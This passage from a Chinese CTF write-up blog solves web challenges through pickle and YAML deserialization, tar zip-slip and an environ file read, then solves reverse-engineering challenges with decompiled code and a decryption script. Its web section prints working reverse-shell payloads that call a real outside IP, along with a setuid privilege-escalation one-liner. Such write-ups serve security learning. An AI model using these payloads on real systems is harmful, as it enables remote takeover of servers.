<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src0de&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src0de</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    rsp = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> rsp[rsp.index(<span class="string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppppppppppick1e</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        rsp = make_response(<span class="string">&quot;Hello, %s &quot;</span> % username)</span><br><span class="line">        rsp.headers[<span class="string">&#x27;hint&#x27;</span>] = <span class="string">&quot;Source in /src0de&quot;</span></span><br><span class="line">        pick1e = request.cookies.get(<span class="string">&#x27;pick1e&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> pick1e <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pick1e = base64.b64decode(pick1e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> rsp</span><br><span class="line">        <span class="keyword">if</span> check(pick1e):</span><br><span class="line">            pick1e = pickle.loads(pick1e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Go for it!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No Way!!!&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> error_message</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GWHT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一眼把这个换到cookie反弹shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 &lt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693652195200-c0c69065-1168-47e4-b9f0-c5d266849560.png#averageHue=%23464442&clientId=u1016775c-414b-4&from=paste&height=237&id=u196b138f&originHeight=237&originWidth=735&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26874&status=done&style=none&taskId=u49d49f1d-0d5d-4724-8855-07dec2f24ae&title=&width=735" alt="image.png"><br>提权</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3<span class="number">.8</span> -c <span class="string">&quot;import os;os.execl(&#x27;/bin/sh&#x27;,&#x27;sh&#x27;,&#x27;-p&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693652226056-c50b276a-1d11-4ed0-90fd-a3a514ff85b6.png#averageHue=%23343231&clientId=u1016775c-414b-4&from=paste&height=208&id=u1cec6d49&originHeight=208&originWidth=716&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20512&status=done&style=none&taskId=u67d4731a-d873-441b-943d-8928e350ddf&title=&width=716" alt="image.png"></p>
<h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><p>非预期：<br><code>/read?file=/proc/1/environ</code></p>
<h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><p>考点：tar的zipslip文件覆盖，yaml反序列化<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693652416639-9aed33dc-375b-48cb-9059-4fd866d4bcb7.png#averageHue=%23fdfdfd&clientId=u1016775c-414b-4&from=paste&height=243&id=u0e5e9a73&originHeight=243&originWidth=1077&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13177&status=done&style=none&taskId=u7d10d517-4f47-4f45-97ea-a9eab676d95&title=&width=1077" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zipslip</span>(<span class="params">tarinfo</span>):</span><br><span class="line">    tarinfo.uid = tarinfo.gid = <span class="number">1000</span></span><br><span class="line">    tarinfo.uname = tarinfo.gname = <span class="string">&quot;poc&quot;</span></span><br><span class="line">    <span class="keyword">return</span> tarinfo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tar = tarfile.<span class="built_in">open</span>(<span class="string">&quot;poc.tar&quot;</span>,<span class="string">&quot;w|&quot;</span>)</span><br><span class="line"></span><br><span class="line">fullpath = os.path.join(<span class="string">&quot;../../&quot;</span>,<span class="string">&quot;config/1.yaml&quot;</span>)</span><br><span class="line">tar.add(fullpath,<span class="built_in">filter</span>=zipslip)</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure>
<p>我的万年脚本，记得保存文件架构为<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693652448655-c2bece1c-df0d-46e3-8484-f7669850fe5a.png#averageHue=%232d3033&clientId=u1016775c-414b-4&from=paste&height=347&id=u4cd1f140&originHeight=347&originWidth=586&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25396&status=done&style=none&taskId=u734520c2-43e8-41c9-9c57-01c437ca839&title=&width=586" alt="image.png"><br>exp目录的<code>../../</code>也有一个config文件夹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp: !!python/<span class="built_in">object</span>/apply:os.system [<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 &lt;&amp;1&#x27;&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>然后上传后访问<code>/src?username=1</code>就可以直接反弹shell，进行yaml反序列化<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693652542206-c4bac843-46ec-481a-ab6c-d66c05974a8f.png#averageHue=%23fcfbfa&clientId=u1016775c-414b-4&from=paste&height=861&id=u05d31a6a&originHeight=861&originWidth=1276&originalType=binary&ratio=1&rotation=0&showTitle=false&size=103350&status=done&style=none&taskId=ub7b37341-de67-4206-a6e5-bfc5a2ab343&title=&width=1276" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693652556864-6a20ddcf-9935-45e5-a061-a64010cd3fd0.png#averageHue=%23484644&clientId=u1016775c-414b-4&from=paste&height=216&id=u61f87628&originHeight=216&originWidth=719&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20594&status=done&style=none&taskId=ubec6fc1e-c105-4829-aaa1-539f91d4684&title=&width=719" alt="image.png"></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="CSGO"><a href="#CSGO" class="headerlink" title="CSGO"></a>CSGO</h2><p>go逆向直接就动态调试拿表就行了。。。<br><code>73913519-A0A6-5575-0F10-DDCBF50FA8CA</code></p>
<h2 id="vm-wo"><a href="#vm-wo" class="headerlink" title="vm_wo"></a>vm_wo</h2><p>我擦，苹果<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693664438921-608b41db-8737-4a3a-91f3-a83ec00fe2f1.png#averageHue=%23464545&clientId=uc1291b28-24de-4&from=paste&height=500&id=w82m0&originHeight=500&originWidth=827&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26816&status=done&style=none&taskId=u643f8ccb-11ea-4cce-849d-3f7a83a1715&title=&width=827" alt="image.png"><br>静态手撸吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 i; <span class="comment">// x8</span></span><br><span class="line">  <span class="type">char</span> __s[<span class="number">16</span>]; <span class="comment">// [xsp+10h] [xbp-E0h] BYREF</span></span><br><span class="line">  __int128 v6; <span class="comment">// [xsp+20h] [xbp-D0h]</span></span><br><span class="line">  __int128 v7; <span class="comment">// [xsp+30h] [xbp-C0h]</span></span><br><span class="line">  __int128 v8; <span class="comment">// [xsp+40h] [xbp-B0h]</span></span><br><span class="line">  __int128 v9; <span class="comment">// [xsp+50h] [xbp-A0h]</span></span><br><span class="line">  __int128 v10; <span class="comment">// [xsp+60h] [xbp-90h]</span></span><br><span class="line">  __int128 v11; <span class="comment">// [xsp+70h] [xbp-80h]</span></span><br><span class="line">  __int128 v12; <span class="comment">// [xsp+80h] [xbp-70h]</span></span><br><span class="line">  __int128 v13; <span class="comment">// [xsp+90h] [xbp-60h]</span></span><br><span class="line">  __int128 v14; <span class="comment">// [xsp+A0h] [xbp-50h]</span></span><br><span class="line">  __int128 v15; <span class="comment">// [xsp+B0h] [xbp-40h]</span></span><br><span class="line">  __int128 v16; <span class="comment">// [xsp+C0h] [xbp-30h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [xsp+D0h] [xbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0</span>, (<span class="type">caddr_t</span>)<span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  v17 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0u</span>;</span><br><span class="line">  v16 = <span class="number">0u</span>;</span><br><span class="line">  v13 = <span class="number">0u</span>;</span><br><span class="line">  v14 = <span class="number">0u</span>;</span><br><span class="line">  v11 = <span class="number">0u</span>;</span><br><span class="line">  v12 = <span class="number">0u</span>;</span><br><span class="line">  v9 = <span class="number">0u</span>;</span><br><span class="line">  v10 = <span class="number">0u</span>;</span><br><span class="line">  v7 = <span class="number">0u</span>;</span><br><span class="line">  v8 = <span class="number">0u</span>;</span><br><span class="line">  *(_OWORD *)__s = <span class="number">0u</span>;</span><br><span class="line">  v6 = <span class="number">0u</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, __s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(__s) != <span class="number">29</span> )</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  myoperate(__s, <span class="number">29</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( __s[i] != byte_100003F47[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ok you get the flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>提取到密文：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsigned char ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  0xDF, 0xD5, 0xF1, 0xD1, 0xFF, 0xDB, 0xA1, 0xA5, 0x89, 0xBD, </span><br><span class="line">  0xE9, 0x95, 0xB3, 0x9D, 0xE9, 0xB3, 0x85, 0x99, 0x87, 0xBF, </span><br><span class="line">  0xE9, 0xB1, 0x89, 0xE9, 0x91, 0x89, 0x89, 0x8F, 0xAD</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>指令好像写死了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">myoperate</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// x20</span></span><br><span class="line">  _QWORD v5[<span class="number">2</span>]; <span class="comment">// [xsp+8h] [xbp-98h] BYREF</span></span><br><span class="line">  _QWORD v6[<span class="number">2</span>]; <span class="comment">// [xsp+18h] [xbp-88h] BYREF</span></span><br><span class="line">  _QWORD v7[<span class="number">2</span>]; <span class="comment">// [xsp+28h] [xbp-78h] BYREF</span></span><br><span class="line">  _QWORD v8[<span class="number">2</span>]; <span class="comment">// [xsp+38h] [xbp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  LODWORD(v2) = a2;</span><br><span class="line">  dword_100008003 = <span class="number">-1091715345</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0</span>, (<span class="type">caddr_t</span>)<span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)v2 &gt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="type">unsigned</span> <span class="type">int</span>)v2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8[<span class="number">0</span>] = <span class="number">0x20D01011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)((<span class="type">char</span> *)v8 + <span class="number">7</span>) = <span class="number">0x300010201180702</span>LL;</span><br><span class="line">      BYTE2(v8[<span class="number">0</span>]) = *a1;</span><br><span class="line">      interpretBytecode((<span class="type">char</span> *)v8, <span class="number">15</span>);</span><br><span class="line">      v7[<span class="number">0</span>] = <span class="number">0x20D02011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)((<span class="type">char</span> *)v7 + <span class="number">7</span>) = <span class="number">0x400010201180602</span>LL;</span><br><span class="line">      BYTE2(v7[<span class="number">0</span>]) = vm_body;</span><br><span class="line">      interpretBytecode((<span class="type">char</span> *)v7, <span class="number">15</span>);</span><br><span class="line">      v6[<span class="number">0</span>] = <span class="number">0x20D03011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)((<span class="type">char</span> *)v6 + <span class="number">7</span>) = <span class="number">0x500010201180502</span>LL;</span><br><span class="line">      BYTE2(v6[<span class="number">0</span>]) = vm_body;</span><br><span class="line">      interpretBytecode((<span class="type">char</span> *)v6, <span class="number">15</span>);</span><br><span class="line">      v5[<span class="number">0</span>] = <span class="number">0x20D04011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)((<span class="type">char</span> *)v5 + <span class="number">7</span>) = <span class="number">0x600010201180402</span>LL;</span><br><span class="line">      BYTE2(v5[<span class="number">0</span>]) = vm_body;</span><br><span class="line">      interpretBytecode((<span class="type">char</span> *)v5, <span class="number">15</span>);</span><br><span class="line">      *a1++ = ((<span class="type">unsigned</span> __int8)vm_body &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * vm_body);</span><br><span class="line">      --v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>手撸，发现加密很对称，写出解密脚本（异或和位移）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    a1 = [<span class="number">0xDF</span>, <span class="number">0xD5</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0xDB</span>, <span class="number">0xA1</span>, <span class="number">0xA5</span>, <span class="number">0x89</span>, <span class="number">0xBD</span>, <span class="number">0xE9</span>, <span class="number">0x95</span>, <span class="number">0xB3</span>, <span class="number">0x9D</span>, <span class="number">0xE9</span>, <span class="number">0xB3</span>, <span class="number">0x85</span>, <span class="number">0x99</span>,</span><br><span class="line">          <span class="number">0x87</span>, <span class="number">0xBF</span>, <span class="number">0xE9</span>, <span class="number">0xB1</span>, <span class="number">0x89</span>, <span class="number">0xE9</span>, <span class="number">0x91</span>, <span class="number">0x89</span>, <span class="number">0x89</span>, <span class="number">0x8F</span>, <span class="number">0xAD</span>, <span class="number">0x57</span>]</span><br><span class="line">    length = <span class="built_in">len</span>(a1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        temp = a1[i]</span><br><span class="line">        temp = ((temp &gt;&gt; <span class="number">3</span>) | (temp &lt;&lt; <span class="number">5</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        temp ^= <span class="number">0xBE</span></span><br><span class="line">        temp = ((temp &gt;&gt; <span class="number">4</span>) | (temp &lt;&lt; <span class="number">4</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        temp ^= <span class="number">0xED</span></span><br><span class="line">        temp = ((temp &gt;&gt; <span class="number">5</span>) | (temp &lt;&lt; <span class="number">3</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        temp ^= <span class="number">0xBE</span></span><br><span class="line">        temp = ((temp &gt;&gt; <span class="number">6</span>) | (temp &lt;&lt; <span class="number">2</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        temp ^= <span class="number">0xEF</span></span><br><span class="line">        temp = ((temp &gt;&gt; <span class="number">7</span>) | (temp &lt;&lt; <span class="number">1</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="comment"># print(temp)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(temp), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>flag：<br>DASCTF{you_are_right_so_cool}</p>
<h2 id="Ez加密器"><a href="#Ez加密器" class="headerlink" title="Ez加密器"></a>Ez加密器</h2><p>通过<code>------\nGetFlag!\n------</code>定位到sub_7FF798C240E0<br>分析如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_7FF798C240E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *v0; <span class="comment">// r8</span></span><br><span class="line">    <span class="type">char</span> *v1; <span class="comment">// rcx</span></span><br><span class="line">    <span class="type">char</span> *v2; <span class="comment">// r9</span></span><br><span class="line">    <span class="type">char</span> v3; <span class="comment">// si</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v4; <span class="comment">// di</span></span><br><span class="line">    <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">    <span class="type">int</span> v7; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v9; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">int</span> v10; <span class="comment">// ebp</span></span><br><span class="line">    <span class="type">int</span> v11; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">int</span> v12; <span class="comment">// er12</span></span><br><span class="line">    <span class="type">int</span> v13; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">char</span> v14; <span class="comment">// di</span></span><br><span class="line">    <span class="type">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v16; <span class="comment">// edx</span></span><br><span class="line">    <span class="type">int</span> v18; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">int</span> v19; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v20; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">int</span> v21; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">int</span> v22; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">int</span> v23; <span class="comment">// ebp</span></span><br><span class="line">    <span class="type">int</span> v24; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">char</span> *v25; <span class="comment">// [rsp+20h] [rbp-D8h] BYREF</span></span><br><span class="line">    __int64 v26; <span class="comment">// [rsp+28h] [rbp-D0h]</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 code_base64[<span class="number">8</span>]; <span class="comment">// [rsp+38h] [rbp-C0h] BYREF</span></span><br><span class="line">    <span class="type">char</span> Str2[<span class="number">184</span>]; <span class="comment">// [rsp+40h] [rbp-B8h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sub_7FF798C13D87</span>();</span><br><span class="line">    <span class="built_in">get_input</span>(code, input);</span><br><span class="line">    <span class="built_in">base64_enc</span>((__int64)code, <span class="number">6u</span>, code_base64);</span><br><span class="line">    <span class="built_in">DES</span>(&amp;v25, code_base64, input, <span class="number">40</span>i64);</span><br><span class="line">    v0 = v25;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)v26 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v2 = Str2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        v1 = Str2;</span><br><span class="line">        v2 = &amp;Str2[<span class="number">2</span> * (<span class="type">int</span>)v26];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                v3 = 